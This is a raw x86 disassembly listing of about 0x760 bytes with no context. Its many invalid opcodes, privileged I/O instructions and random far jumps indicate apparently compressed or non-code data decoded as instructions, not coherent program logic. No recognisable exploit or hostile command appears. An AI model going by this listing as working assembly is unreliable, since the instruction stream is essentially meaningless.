  41ee39:	cld    
  41ee3a:	pop    ebx
  41ee3b:	mov    cl,0xf4
  41ee3d:	out    dx,eax
  41ee3e:	mov    ebx,0x984f1288
  41ee43:	aaa    
  41ee44:	test   DWORD PTR [ebx],ecx
  41ee46:	loopne 0x41ee1b
  41ee48:	shl    DWORD PTR [ebp-0x44111a8c],cl
  41ee4e:	shr    DWORD PTR [edi+0x39498219],0xca
  41ee55:	dec    ebp
  41ee56:	jge    0x41ee11
  41ee58:	sar    BYTE PTR [edi],1
  41ee5a:	sahf   
  41ee5b:	cmp    BYTE PTR [edi-0x1d4b64c6],0xbc
  41ee62:	iret   
  41ee63:	mov    dh,0x35
  41ee65:	add    DWORD PTR [edi-0x12],esp
  41ee68:	lds    ecx,FWORD PTR ds:[esi+edi*4]
  41ee6c:	scas   al,BYTE PTR es:[edi]
  41ee6d:	dec    esp
  41ee6e:	push   ebx
  41ee6f:	dec    esi
  41ee70:	cdq    
  41ee71:	pop    eax
  41ee72:	das    
  41ee73:	loope  0x41ee92
  41ee75:	dec    eax
  41ee76:	dec    edi
  41ee77:	mov    ah,0x90
  41ee79:	cmp    al,0x2c
  41ee7b:	sbb    cl,BYTE PTR [eax+0x12]
  41ee7e:	push   eax
  41ee7f:	inc    esi
  41ee80:	int    0xe1
  41ee82:	adc    al,0x2f
  41ee84:	or     DWORD PTR [ebx],esi
  41ee86:	bound  esp,QWORD PTR [edx+0x710fb7cc]
  41ee8c:	sub    al,0x95
  41ee8e:	not    ch
  41ee90:	data16 cmc 
  41ee92:	leave  
  41ee93:	sub    al,0x36
  41ee95:	jmp    0x9c42:0x3e25c400
  41ee9c:	jmp    0xe95c:0x8768cb8c
  41eea3:	xlat   BYTE PTR ds:[ebx]
  41eea4:	or     al,0xb6
  41eea6:	or     ebp,DWORD PTR [ebx]
  41eea8:	dec    esi
  41eea9:	pop    eax
  41eeaa:	popa   
  41eeab:	xchg   DWORD PTR [ecx-0x4ddb546a],esp
  41eeb1:	dec    edi
  41eeb2:	sbb    esp,edx
  41eeb4:	jns    0x41ee44
  41eeb6:	push   ebx
  41eeb7:	aas    
  41eeb8:	mov    bh,0xde
  41eeba:	add    DWORD PTR [ebp+0x19216265],0x2b8de26d
  41eec4:	jle    0x41ef27
  41eec6:	pop    eax
  41eec7:	das    
  41eec8:	fs in  al,0x9e
  41eecb:	arpl   WORD PTR [esi],sp
  41eecd:	add    esi,DWORD PTR [ebp+0xb]
  41eed0:	inc    ebx
  41eed1:	out    0xd,al
  41eed3:	int    0x39
  41eed5:	ret    
  41eed6:	lods   al,BYTE PTR ds:[esi]
  41eed7:	int    0x78
  41eed9:	mov    ch,0x82
  41eedb:	daa    
  41eedc:	sbb    dh,BYTE PTR [ebx+ecx*2-0x32eb1fb8]
  41eee3:	inc    esp
  41eee4:	std    
  41eee5:	xchg   esi,eax
  41eee6:	test   eax,0xb9b6e93
  41eeeb:	pop    ds
  41eeec:	in     al,dx
  41eeed:	adc    DWORD PTR [ebx+eax*2],edi
  41eef0:	sub    DWORD PTR [ebx-0xe5e30bd],0x745fe518
  41eefa:	sbb    ecx,DWORD PTR [ebp+0x5c]
  41eefd:	fdiv   st,st(3)
  41eeff:	imul   edx,DWORD PTR [edx],0x7e
  41ef02:	inc    ebp
  41ef03:	sbb    cl,BYTE PTR [ebp-0x4a8b869]
  41ef09:	pop    esi
  41ef0a:	sar    DWORD PTR [esi+0x3c],0x22
  41ef0e:	sahf   
  41ef0f:	push   0xf7896c69
  41ef14:	mov    bh,0x32
  41ef16:	ror    dl,cl
  41ef18:	or     DWORD PTR [eax],edi
  41ef1a:	fcmovnu st,st(2)
  41ef1c:	fdivrp st(7),st
  41ef1e:	jmp    0xef48:0x259b5fdf
  41ef25:	es ins BYTE PTR es:[edi],dx
  41ef27:	ins    DWORD PTR es:[edi],dx
  41ef28:	das    
  41ef29:	imul   ebx,DWORD PTR [ecx+0x7],0xd41f568c
  41ef30:	sbb    edx,esi
  41ef32:	mov    dh,0x3d
  41ef34:	mov    ah,0xfd
  41ef36:	push   esi
  41ef37:	mov    dh,0x2a
  41ef39:	sar    DWORD PTR [ebp-0x4d],0xd8
  41ef3d:	je     0x41ef18
  41ef3f:	xchg   ebx,eax
  41ef40:	iret   
  41ef41:	sbb    al,0x86
  41ef43:	mov    WORD PTR [edi],?
  41ef45:	dec    eax
  41ef46:	pop    es
  41ef47:	sbb    eax,0xb936e83b
  41ef4c:	jle    0x41ef00
  41ef4e:	pop    esp
  41ef4f:	pushf  
  41ef50:	xor    dh,0x59
  41ef53:	or     ecx,DWORD PTR [eax+0x39]
  41ef56:	xlat   BYTE PTR ds:[ebx]
  41ef57:	fcomp  QWORD PTR [edi-0x61]
  41ef5a:	cwde   
  41ef5b:	mov    ch,0xcc
  41ef5d:	mov    ch,0xc8
  41ef5f:	sub    eax,0x92da8482
  41ef64:	shr    esi,1
  41ef66:	add    BYTE PTR [edi-0x1a],al
  41ef69:	dec    ecx
  41ef6a:	lods   eax,DWORD PTR ds:[esi]
  41ef6b:	or     ebx,DWORD PTR ds:0x7e8cb8ee
  41ef71:	mov    ds:0x174d42e4,eax
  41ef76:	repnz test BYTE PTR [ebx+0x7308eef],dh
  41ef7d:	repz adc al,0xae
  41ef80:	and    ch,ch
  41ef82:	sub    BYTE PTR [eax],dl
  41ef84:	dec    eax
  41ef85:	jbe    0x41efc3
  41ef87:	dec    eax
  41ef88:	sbb    eax,DWORD PTR [ebp+0x19]
  41ef8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef8c:	adc    al,0x99
  41ef8e:	or     al,0x80
  41ef90:	mov    eax,ds:0xb7695b90
  41ef95:	xchg   esi,eax
  41ef96:	push   eax
  41ef97:	jle    0x41efc4
  41ef99:	pop    ds
  41ef9a:	push   esi
  41ef9b:	setae  BYTE PTR [edx+0x26]
  41ef9f:	inc    edx
  41efa0:	push   0x16
  41efa2:	jns    0x41efd0
  41efa4:	ins    BYTE PTR es:[edi],dx
  41efa5:	mov    dl,0x18
  41efa7:	and    al,0x94
  41efa9:	sbb    bh,ah
  41efab:	mov    ebx,0xe9073b94
  41efb0:	data16 into 
  41efb2:	sahf   
  41efb3:	push   0xfffffff7
  41efb5:	xor    al,0x10
  41efb7:	push   0x38918716
  41efbc:	adc    eax,0x50add241
  41efc1:	call   0xaf96:0xefa03d58
  41efc8:	mov    bl,0xee
  41efca:	scas   eax,DWORD PTR es:[edi]
  41efcb:	std    
  41efcc:	aaa    
  41efcd:	cmp    DWORD PTR [ecx],esi
  41efcf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efd0:	mov    BYTE PTR [ebp+0x6e36bdfc],dl
  41efd6:	jecxz  0x41eff7
  41efd8:	aas    
  41efd9:	int    0x91
  41efdb:	call   0x558e:0x22444b5b
  41efe2:	iret   
  41efe3:	aaa    
  41efe4:	out    0x94,eax
  41efe6:	scas   al,BYTE PTR es:[edi]
  41efe7:	mov    ds:0xb05dc885,al
  41efec:	pop    ecx
  41efed:	in     eax,dx
  41efee:	mov    ch,0xe1
  41eff0:	or     esp,eax
  41eff2:	int    0xc2
  41eff4:	xchg   esi,eax
  41eff5:	adc    eax,0x116627be
  41effa:	push   edx
  41effb:	es pushf 
  41effd:	mov    edx,DWORD PTR [edi-0x1a84479b]
  41f003:	jno    0x41f011
  41f005:	inc    esp
  41f006:	aas    
  41f007:	and    BYTE PTR [ecx+0x3783727],0xb4
  41f00e:	imul   BYTE PTR [eax+0x60a02e56]
  41f014:	mov    cl,0xa3
  41f016:	jp     0x41f02a
  41f018:	jb     0x41f098
  41f01a:	je     0x41f05f
  41f01c:	out    dx,eax
  41f01d:	fbld   TBYTE PTR [edx+esi*4-0x3ab5e1d4]
  41f025:	push   edi
  41f026:	mov    ds:0xc4a73a9e,al
  41f02b:	xor    al,BYTE PTR [ecx]
  41f02d:	and    BYTE PTR [esi+esi*1],dl
  41f030:	xor    al,0x64
  41f032:	xchg   BYTE PTR [esi],cl
  41f034:	call   FWORD PTR [esi-0x3228f019]
  41f03a:	xchg   ebp,eax
  41f03b:	outs   dx,BYTE PTR ds:[esi]
  41f03c:	mov    edx,ebp
  41f03e:	jecxz  0x41efe3
  41f040:	mov    al,cs:0xd79d9b2e
  41f046:	(bad)  
  41f047:	stc    
  41f048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f049:	cmp    al,0x35
  41f04b:	imul   eax,DWORD PTR [ebx-0x320f80de],0xffffff9b
  41f052:	stos   DWORD PTR es:[edi],eax
  41f053:	mov    al,BYTE PTR [ebp+0x69fdf8cf]
  41f059:	adc    eax,0x1fff5690
  41f05e:	repz jmp 0x41f00d
  41f061:	push   ebp
  41f062:	pop    eax
  41f063:	jns    0x41f03d
  41f065:	in     eax,0x49
  41f067:	inc    ebx
  41f068:	pop    esp
  41f069:	and    eax,0x1320bf28
  41f06e:	push   ebp
  41f06f:	xchg   edx,eax
  41f070:	jmp    0x39fd76a5
  41f075:	int    0xc0
  41f077:	(bad)  
  41f079:	mov    esp,0xfce8f175
  41f07e:	pop    esi
  41f07f:	test   DWORD PTR [edx-0xa],esi
  41f082:	retf   
  41f083:	jae    0x41f0b5
  41f085:	push   0xf82bec8b
  41f08a:	nop
  41f08b:	adc    ebx,DWORD PTR [esi+0x3a9b47e8]
  41f091:	out    0xc2,al
  41f093:	jae    0x41f01a
  41f095:	mov    dl,0xc
  41f097:	imul   DWORD PTR [ebx]
  41f099:	cmp    DWORD PTR [ebp+0x41],edx
  41f09c:	push   ss
  41f09d:	push   ds
  41f09e:	icebp  
  41f09f:	lds    esp,FWORD PTR [ecx+ecx*4+0x7a]
  41f0a3:	xchg   ecx,eax
  41f0a4:	and    eax,0xd6c756a1
  41f0a9:	icebp  
  41f0aa:	sti    
  41f0ab:	and    eax,0x2224f8fe
  41f0b0:	outs   dx,BYTE PTR ds:[esi]
  41f0b1:	push   esi
  41f0b2:	sub    dl,dh
  41f0b4:	outs   dx,BYTE PTR ds:[esi]
  41f0b5:	and    dl,BYTE PTR [ebx+eiz*8-0x3f]
  41f0b9:	jle    0x41f053
  41f0bb:	shr    DWORD PTR [ebp+edi*2+0x4],0x63
  41f0c0:	es mov esi,0xb88b87ab
  41f0c6:	or     BYTE PTR [ecx-0x39],al
  41f0c9:	cmp    edi,DWORD PTR [esi]
  41f0cb:	jne    0x41f0fd
  41f0cd:	ss jecxz 0x41f089
  41f0d0:	and    eax,0xb1d4453c
  41f0d5:	jle    0x41f0c2
  41f0d7:	stc    
  41f0d8:	sbb    eax,0xeefb4952
  41f0dd:	and    DWORD PTR [ecx+eax*8],eax
  41f0e0:	in     eax,0x21
  41f0e2:	xchg   esp,eax
  41f0e3:	arpl   WORD PTR [ebx],sp
  41f0e5:	xor    BYTE PTR [ebx+0x75],dh
  41f0e8:	ret    0xd53b
  41f0eb:	je     0x41f099
  41f0ed:	cdq    
  41f0ee:	ret    
  41f0ef:	lods   al,BYTE PTR ds:[esi]
  41f0f0:	push   ecx
  41f0f1:	dec    edi
  41f0f2:	mov    fs,WORD PTR [edi-0x6d]
  41f0f5:	ins    DWORD PTR es:[edi],dx
  41f0f6:	push   ebp
  41f0f7:	imul   esi,ebx,0xfffffffd
  41f0fa:	loop   0x41f0f1
  41f0fc:	mov    ebp,0x4978758
  41f101:	dec    ebp
  41f102:	lods   eax,DWORD PTR ds:[esi]
  41f103:	mov    ds:0x2b402fe8,eax
  41f108:	outs   dx,DWORD PTR ds:[esi]
  41f109:	jae    0x41f10a
  41f10b:	nop
  41f10c:	sbb    ch,BYTE PTR [edi]
  41f10e:	popa   
  41f10f:	mov    esp,0xf858eb4
  41f114:	mov    ebp,0xcf62787e
  41f119:	loope  0x41f13a
  41f11b:	mov    eax,ds:0x740fab9d
  41f120:	pop    ebp
  41f121:	int    0x71
  41f123:	cmp    eax,0x547041c4
  41f128:	aad    0xb6
  41f12a:	in     eax,0x2c
  41f12c:	mov    eax,ds:0x4811a457
  41f131:	call   0x4e22:0x1ae0d2e6
  41f138:	(bad)  
  41f139:	adc    ebp,DWORD PTR [edi+0x2477f8f8]
  41f13f:	push   ds
  41f140:	xor    esp,DWORD PTR [ebp+0x455cfb29]
  41f146:	jge    0x41f19e
  41f148:	xor    eax,DWORD PTR [ebx+eax*1+0x4b]
  41f14c:	pop    ebx
  41f14d:	push   0x7293beac
  41f152:	sbb    edi,DWORD PTR ds:0x437b707b
  41f158:	test   DWORD PTR [eax+0x5b],esp
  41f15b:	cdq    
  41f15c:	inc    ebp
  41f15d:	call   0x7a78:0x16147cec
  41f164:	cmp    ecx,0xb5567cfb
  41f16a:	jo     0x41f13f
  41f16c:	jecxz  0x41f127
  41f16e:	pop    edi
  41f16f:	cs mov ecx,0x39b06085
  41f175:	not    BYTE PTR [eax]
  41f177:	sbb    dh,BYTE PTR [esp+edi*2+0x71]
  41f17b:	daa    
  41f17c:	imul   eax,DWORD PTR ds:0x6c655ab2,0x86e6e6ad
  41f186:	inc    eax
  41f187:	call   0xbbb:0x418446da
  41f18e:	mov    cl,0xb5
  41f190:	inc    edx
  41f191:	out    0x3c,al
  41f193:	iret   
  41f194:	mov    cl,0x1e
  41f196:	sahf   
  41f197:	sti    
  41f198:	imul   eax,DWORD PTR [ebx],0xffffffae
  41f19b:	pop    es
  41f19c:	push   ss
  41f19d:	ins    BYTE PTR es:[edi],dx
  41f19e:	dec    ecx
  41f19f:	into   
  41f1a0:	lods   al,BYTE PTR ds:[esi]
  41f1a1:	lahf   
  41f1a2:	lods   al,BYTE PTR ds:[esi]
  41f1a3:	jp     0x41f173
  41f1a5:	push   0xe40ed62b
  41f1aa:	jnp    0x41f1c3
  41f1ac:	mov    al,0x5d
  41f1ae:	out    dx,eax
  41f1af:	repnz dec eax
  41f1b1:	(bad)  
  41f1b2:	rol    DWORD PTR gs:[ebx],cl
  41f1b5:	inc    ebx
  41f1b6:	mov    DWORD PTR [ebx+0x10],eax
  41f1b9:	das    
  41f1ba:	retf   
  41f1bb:	je     0x41f175
  41f1bd:	repz popa 
  41f1bf:	or     bh,bh
  41f1c1:	ds or  eax,0x41c2111a
  41f1c7:	call   FWORD PTR ss:[ecx+0x3c25097f]
  41f1ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1cf:	les    edi,FWORD PTR [ebp-0x4bfb720f]
  41f1d5:	push   ds
  41f1d6:	retf   0x21ac
  41f1d9:	hlt    
  41f1da:	cli    
  41f1db:	adc    dl,BYTE PTR [eax]
  41f1dd:	and    eax,0xd8665256
  41f1e2:	pop    esi
  41f1e3:	ds xchg ecx,eax
  41f1e5:	enter  0xbcf,0x80
  41f1e9:	xor    al,0x8a
  41f1eb:	push   eax
  41f1ec:	mov    ebp,0xf5f89520
  41f1f1:	xchg   ecx,eax
  41f1f2:	pushf  
  41f1f3:	xor    al,0x45
  41f1f5:	push   ecx
  41f1f6:	mov    WORD PTR [eax-0x50],?
  41f1f9:	inc    ebp
  41f1fa:	or     edi,DWORD PTR [edx-0x11613fa4]
  41f200:	mov    dh,0x26
  41f202:	ins    DWORD PTR es:[edi],dx
  41f203:	dec    edx
  41f204:	sub    esi,DWORD PTR [ebp-0x57]
  41f207:	pop    ds
  41f208:	adc    dh,BYTE PTR [ecx]
  41f20a:	or     eax,0x3d45577e
  41f20f:	xor    BYTE PTR [edx+0x56],ah
  41f212:	jno    0x41f1a4
  41f214:	mov    bl,0x95
  41f216:	push   ss
  41f217:	clc    
  41f218:	push   cs
  41f219:	adc    bh,BYTE PTR [eax+0x7fd748b3]
  41f21f:	(bad)  
  41f220:	mov    bh,0x66
  41f222:	push   ebp
  41f223:	icebp  
  41f224:	pop    ss
  41f225:	push   ebp
  41f226:	(bad)  [ecx]
  41f228:	dec    esi
  41f229:	repnz and dl,BYTE PTR [edx+0x3792c373]
  41f230:	mov    ecx,0xedf570bb
  41f235:	pusha  
  41f236:	and    BYTE PTR fs:[esi+0x64a3c860],bh
  41f23d:	out    dx,al
  41f23e:	or     BYTE PTR [ebx],bl
  41f240:	add    al,dh
  41f242:	add    edx,DWORD PTR [ecx-0x1c]
  41f245:	es sti 
  41f247:	stos   DWORD PTR es:[edi],eax
  41f248:	or     eax,0xe902b8ac
  41f24d:	pandn  mm5,QWORD PTR [esi+0x51c5824e]
  41f254:	pop    ebp
  41f255:	dec    esi
  41f256:	push   esp
  41f257:	stos   BYTE PTR es:[edi],al
  41f258:	mov    ebx,0xbde1b3ef
  41f25d:	fldcw  WORD PTR [ebx+0x6]
  41f260:	scas   al,BYTE PTR es:[edi]
  41f261:	scas   al,BYTE PTR es:[edi]
  41f262:	pop    ebx
  41f263:	ss sbb al,bl
  41f266:	into   
  41f267:	outs   dx,DWORD PTR ds:[esi]
  41f268:	push   ebp
  41f269:	outs   dx,DWORD PTR ds:[esi]
  41f26a:	push   edx
  41f26b:	repnz pusha 
  41f26d:	mov    dl,BYTE PTR [esp+eax*2-0x52]
  41f271:	hlt    
  41f272:	and    dh,BYTE PTR [eiz*4-0x9e0dc76]
  41f279:	fadd   QWORD PTR [ecx+eiz*1-0x2a]
  41f27d:	lock retf 0xe5b7
  41f281:	push   ebp
  41f282:	jl     0x41f23a
  41f284:	hlt    
  41f285:	cmc    
  41f286:	push   DWORD PTR [eax+0x1abc45b0]
  41f28c:	imul   edi,DWORD PTR [edx+ebx*1],0xffffffe5
  41f290:	icebp  
  41f291:	xor    eax,0x352c88ff
  41f296:	(bad)  
  41f297:	cs push es
  41f299:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f29a:	pusha  
  41f29b:	sub    al,al
  41f29d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f29e:	lea    ebp,[eax]
  41f2a0:	jne    0x41f2ce
  41f2a2:	sahf   
  41f2a3:	mov    bl,0x14
  41f2a5:	adc    al,0x89
  41f2a7:	xchg   esi,eax
  41f2a8:	mov    fs,WORD PTR [edx]
  41f2aa:	pushf  
  41f2ab:	ds mov dl,0xa
  41f2ae:	hlt    
  41f2af:	pop    esp
  41f2b0:	clc    
  41f2b1:	lods   al,BYTE PTR ds:[esi]
  41f2b2:	(bad)  
  41f2b3:	pop    ebx
  41f2b4:	(bad)  
  41f2b5:	mov    al,ds:0x6a4b8172
  41f2ba:	or     eax,0x26cec96
  41f2bf:	jbe    0x41f266
  41f2c1:	push   ds
  41f2c2:	push   ds
  41f2c3:	pop    eax
  41f2c4:	jp     0x41f2f4
  41f2c6:	or     cl,ah
  41f2c8:	or     DWORD PTR [edx],ecx
  41f2ca:	cmp    BYTE PTR [ebp-0x586501ba],ch
  41f2d0:	dec    eax
  41f2d1:	mov    al,ds:0xe31c2474
  41f2d6:	lods   al,BYTE PTR ds:[esi]
  41f2d7:	ss mov ebx,0xe6446b39
  41f2dd:	addr16 lock sub cl,ah
  41f2e1:	ja     0x41f2c8
  41f2e3:	add    al,0xd1
  41f2e5:	jmp    0x41f28d
  41f2e7:	cs jl  0x41f32a
  41f2ea:	enter  0xe877,0xf3
  41f2ee:	sbb    eax,0x8983528f
  41f2f3:	ins    DWORD PTR es:[edi],dx
  41f2f4:	jns    0x41f283
  41f2f6:	addr16 pop ebp
  41f2f8:	addr16 add eax,0xb041f46e
  41f2fe:	ficomp WORD PTR [ecx]
  41f300:	or     eax,0x92cd46a9
  41f305:	jnp    0x41f348
  41f307:	scas   eax,DWORD PTR es:[edi]
  41f308:	mov    esp,0x1889f884
  41f30d:	(bad)  
  41f30e:	call   0x566c:0xb1111ae2
  41f315:	sbb    eax,0x27c08e76
  41f31a:	push   edi
  41f31b:	push   0xc30d52dd
  41f320:	mov    cl,0xfb
  41f322:	add    DWORD PTR ds:0x3baa51e4,0x4d
  41f329:	pop    ds
  41f32a:	icebp  
  41f32b:	jp     0x41f313
  41f32d:	pop    esi
  41f32e:	(bad)  
  41f32f:	test   DWORD PTR [esp+edi*4],ecx
  41f332:	les    ebx,FWORD PTR [edx+0x1918924]
  41f338:	fs in  eax,dx
  41f33a:	inc    edx
  41f33b:	and    eax,ebx
  41f33d:	loop   0x41f36a
  41f33f:	cmp    al,0xf6
  41f341:	jecxz  0x41f34b
  41f343:	(bad)  
  41f344:	xchg   edi,eax
  41f345:	out    dx,eax
  41f346:	mov    al,BYTE PTR [edi-0x40]
  41f349:	cwde   
  41f34a:	iret   
  41f34b:	add    ebx,DWORD PTR [esi-0x4c5139d9]
  41f351:	mov    ch,0x12
  41f353:	mov    ch,0xdf
  41f355:	mov    esp,ebp
  41f357:	frstor [ebp-0x19e8c13f]
  41f35d:	aas    
  41f35e:	and    eax,0x51484598
  41f363:	push   0x16
  41f365:	aad    0x71
  41f367:	fldenv [edi+0x36]
  41f36a:	xor    edi,DWORD PTR [ecx-0x7c520887]
  41f370:	lds    eax,FWORD PTR [eax]
  41f372:	retf   
  41f373:	clc    
  41f374:	xlat   BYTE PTR ds:[ebx]
  41f375:	push   ecx
  41f376:	shr    ecx,cl
  41f378:	mov    al,ds:0x6f7ffc59
  41f37d:	inc    eax
  41f37e:	cmp    DWORD PTR [esi],esi
  41f380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f381:	add    ah,bh
  41f383:	aad    0x9
  41f385:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f386:	dec    eax
  41f387:	sbb    al,0x15
  41f389:	sbb    ch,cl
  41f38b:	mov    dl,0x23
  41f38d:	xor    ch,al
  41f38f:	xchg   edi,esp
  41f391:	fistp  DWORD PTR [ebx+0x3]
  41f394:	sbb    eax,DWORD PTR [edx+0x21c28a1e]
  41f39a:	mov    edx,DWORD PTR [ecx-0x1ab4ba35]
  41f3a0:	push   ds
  41f3a1:	fwait
  41f3a2:	jae    0x41f41b
  41f3a4:	cmc    
  41f3a5:	ret    0x3f42
  41f3a8:	mov    ebp,0xab56544d
  41f3ad:	sbb    ch,BYTE PTR [eax-0x4bd0a4d5]
  41f3b3:	inc    esi
  41f3b4:	aad    0x35
  41f3b6:	pop    esp
  41f3b7:	lods   eax,DWORD PTR ds:[esi]
  41f3b8:	mov    ah,BYTE PTR [esp]
  41f3bb:	std    
  41f3bc:	ret    
  41f3bd:	pop    ds
  41f3be:	mov    ?,WORD PTR [eax-0x238865f0]
  41f3c4:	inc    esi
  41f3c5:	fs test ah,bl
  41f3c8:	ror    BYTE PTR [edx-0x668c7edd],0x46
  41f3cf:	test   esp,ebx
  41f3d1:	sti    
  41f3d2:	imul   ebp,DWORD PTR [ecx+0x67],0xd83b1ab9
  41f3d9:	sbb    dh,bh
  41f3db:	repz mov ds:0x7231552e,al
  41f3e1:	call   0x5c91:0x1dec99f4
  41f3e8:	push   ss
  41f3e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3ea:	push   ss
  41f3eb:	push   ss
  41f3ec:	mov    WORD PTR [edx-0x4d826373],es
  41f3f2:	rol    DWORD PTR [ecx+0x78],cl
  41f3f5:	xor    al,0x9c
  41f3f7:	iret   
  41f3f8:	fisub  WORD PTR [ebp-0x48]
  41f3fb:	and    al,al
  41f3fd:	out    0xcf,al
  41f3ff:	rcr    DWORD PTR [ecx+0x7d154e43],1
  41f405:	adc    DWORD PTR [eax-0x5e],0x11
  41f409:	ins    DWORD PTR es:[edi],dx
  41f40a:	sub    DWORD PTR [edx+0x16],0x97804099
  41f411:	outs   dx,DWORD PTR ds:[esi]
  41f412:	xor    esi,DWORD PTR [eax]
  41f414:	cmp    eax,0x4085f09
  41f419:	or     DWORD PTR [edx-0x6454bae6],edi
  41f41f:	icebp  
  41f420:	mov    ecx,eax
  41f422:	call   FWORD PTR [edi]
  41f424:	bound  eax,QWORD PTR [edx+0x317aa16d]
  41f42a:	xlat   BYTE PTR ds:[ebx]
  41f42b:	dec    esp
  41f42c:	sub    BYTE PTR [edx-0xc],0x14
  41f430:	cmp    cl,BYTE PTR [ebx-0x435cb7b9]
  41f436:	jo     0x41f45c
  41f438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f439:	fistp  WORD PTR [ebp+0x6f146e31]
  41f43f:	rcr    BYTE PTR [esi-0x13],1
  41f442:	mov    cs,WORD PTR [edi+0x26f0b1be]
  41f448:	sti    
  41f449:	scas   al,BYTE PTR es:[edi]
  41f44a:	aas    
  41f44b:	je     0x41f484
  41f44d:	in     eax,dx
  41f44e:	inc    esi
  41f44f:	retf   0x3d14
  41f452:	pop    edx
  41f453:	lods   eax,DWORD PTR ds:[esi]
  41f454:	bound  edx,QWORD PTR [edi+0x72]
  41f457:	hlt    
  41f458:	stos   DWORD PTR es:[edi],eax
  41f459:	jge    0x41f448
  41f45b:	mov    ecx,0x39c3cac8
  41f460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f461:	fidivr WORD PTR [ebx]
  41f463:	jp     0x41f3f5
  41f465:	mov    ch,0xdd
  41f467:	and    al,0xfc
  41f469:	leave  
  41f46a:	aaa    
  41f46b:	add    al,0x5d
  41f46d:	cmp    eax,0x84d38769
  41f472:	lods   al,BYTE PTR ds:[esi]
  41f473:	cdq    
  41f474:	leave  
  41f475:	push   cs
  41f476:	mov    eax,ds:0xcb598bb7
  41f47b:	jb     0x41f4e0
  41f47d:	sub    al,0xbb
  41f47f:	cli    
  41f480:	hlt    
  41f481:	xor    DWORD PTR ds:[ebx+0x79a72f40],ebx
  41f488:	outs   dx,BYTE PTR ds:[esi]
  41f489:	add    eax,0xee58fd72
  41f48e:	out    0x85,al
  41f490:	dec    esi
  41f491:	(bad)  
  41f492:	(bad)  
  41f493:	push   ecx
  41f494:	js     0x41f433
  41f496:	dec    ebx
  41f497:	push   0x76c07cfe
  41f49c:	pop    ds
  41f49d:	and    dl,BYTE PTR [ecx+0x39]
  41f4a0:	(bad)  
  41f4a1:	adc    eax,0xbf93a22
  41f4a6:	stos   DWORD PTR es:[edi],eax
  41f4a7:	sbb    al,0x4f
  41f4a9:	jnp    0x41f4d5
  41f4ab:	scas   al,BYTE PTR es:[edi]
  41f4ac:	mov    WORD PTR [ebx],?
  41f4ae:	pop    eax
  41f4af:	pop    edi
  41f4b0:	xchg   edi,eax
  41f4b1:	mov    ch,0xdd
  41f4b3:	xor    esp,0x7985c0fa
  41f4b9:	inc    ebp
  41f4ba:	stos   BYTE PTR es:[edi],al
  41f4bb:	xor    dh,ch
  41f4bd:	jb     0x41f490
  41f4bf:	add    eax,0xae887bdf
  41f4c4:	in     eax,0x64
  41f4c6:	shl    DWORD PTR [esi],cl
  41f4c8:	jo     0x41f470
  41f4ca:	adc    dl,BYTE PTR [edx]
  41f4cc:	or     edx,edx
  41f4ce:	ss scas eax,DWORD PTR es:[edi]
  41f4d0:	jno    0x41f4f2
  41f4d2:	in     eax,0x23
  41f4d4:	or     bl,BYTE PTR [edx+0x60]
  41f4d7:	lea    ebx,[eax-0x7d21ec23]
  41f4dd:	push   esi
  41f4de:	dec    ecx
  41f4df:	cmp    ebp,eax
  41f4e1:	(bad)  
  41f4e3:	stos   DWORD PTR es:[edi],eax
  41f4e4:	xor    al,0x73
  41f4e6:	fcomp  DWORD PTR [ebp+0x1ceab017]
  41f4ec:	cwde   
  41f4ed:	or     eax,0xe7d2bde4
  41f4f2:	aad    0xcf
  41f4f4:	cmp    BYTE PTR [ecx+0x38bf180c],bh
  41f4fa:	iret   
  41f4fb:	xchg   ebp,eax
  41f4fc:	pop    es
  41f4fd:	int    0xbe
  41f4ff:	xchg   BYTE PTR [esi],ch
  41f501:	mov    BYTE PTR [edi-0x1a],0xf1
  41f505:	mov    bh,0x5c
  41f507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f508:	pop    DWORD PTR ds:0x8047eda0
  41f50e:	jb     0x41f529
  41f510:	dec    ecx
  41f511:	out    dx,al
  41f512:	or     dl,ah
  41f514:	bound  edx,QWORD PTR [ecx]
  41f516:	out    0x8d,al
  41f518:	or     DWORD PTR [edx+0x1f],0xffffff8f
  41f51c:	mov    bh,0x34
  41f51e:	sub    esi,edx
  41f520:	mul    ch
  41f522:	mov    esp,0x3ba6914
  41f527:	daa    
  41f528:	sub    eax,0xff488af
  41f52d:	fstp   st(5)
  41f52f:	mov    ds:0xd1b36bb1,eax
  41f534:	jbe    0x41f54e
  41f536:	popa   
  41f537:	cmp    ebx,DWORD PTR [edx-0x31f91b79]
  41f53d:	push   ecx
  41f53e:	add    DWORD PTR ds:0x2a347948,0xffffffec
  41f545:	dec    ebp
  41f546:	loop   0x41f4c8
  41f548:	add    eax,0xb3678bcd
  41f54d:	push   edx
  41f54e:	scas   al,BYTE PTR es:[edi]
  41f54f:	cmp    eax,0xed629d87
  41f554:	lods   eax,DWORD PTR ds:[esi]
  41f555:	scas   eax,DWORD PTR es:[edi]
  41f556:	push   ebx
  41f557:	or     BYTE PTR [eax+0x38],bh
  41f55a:	lock push 0xffffff9f
  41f55d:	test   al,0xd9
  41f55f:	aas    
  41f560:	dec    edx
  41f561:	je     0x41f59a
  41f563:	pop    es
  41f564:	push   0xffffffe6
  41f566:	or     eax,DWORD PTR gs:[ecx+0x23e56d03]
  41f56d:	push   cs
  41f56e:	xor    BYTE PTR [ebp+0x6fba381c],ch
  41f574:	jge    0x41f541
  41f576:	icebp  
  41f577:	add    eax,0xbacbd375
  41f57c:	xchg   ebp,eax
  41f57d:	mov    al,ds:0xdff9a4a0
  41f582:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f583:	mov    eax,ds:0x92310f7f
  41f588:	mov    eax,0x6070fa5d
  41f58d:	sbb    ecx,DWORD PTR [ebx*8+0x13f4068d]
  41f594:	cmp    eax,0x11479c6f
  41f599:	sub    ebp,0xe48ca502
  41f59f:	loope  0x41f52f
  41f5a1:	add    eax,0x6ef050e5
